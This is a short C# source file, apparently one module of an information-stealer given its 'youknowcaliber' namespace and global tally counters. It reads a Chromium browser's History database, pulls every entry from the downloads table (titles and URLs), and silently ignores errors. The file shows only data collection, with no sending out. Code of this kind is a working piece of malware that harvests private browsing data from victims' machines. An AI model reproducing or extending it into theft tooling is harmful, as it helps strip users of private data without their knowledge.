using System.Collections.Generic;

namespace youknowcaliber.Chromium
{
    internal sealed class Downloads
    {
    
        public static List<Site> Get(string sHistory)
        {
            List<Site> scDownloads = new List<Site>();
            try
            {
                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sHistory, "downloads");
                if (sSQLite == null) return scDownloads;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    Site sSite = new Site();
                    sSite.sTitle = Crypto.GetUTF8(sSQLite.GetValue(i, 2));
                    sSite.sUrl = Crypto.GetUTF8(sSQLite.GetValue(i, 17));
                    Counting.Downloads++;
                    scDownloads.Add(sSite);
                }
            }
            catch {  }
            return scDownloads;
        }
    }
}
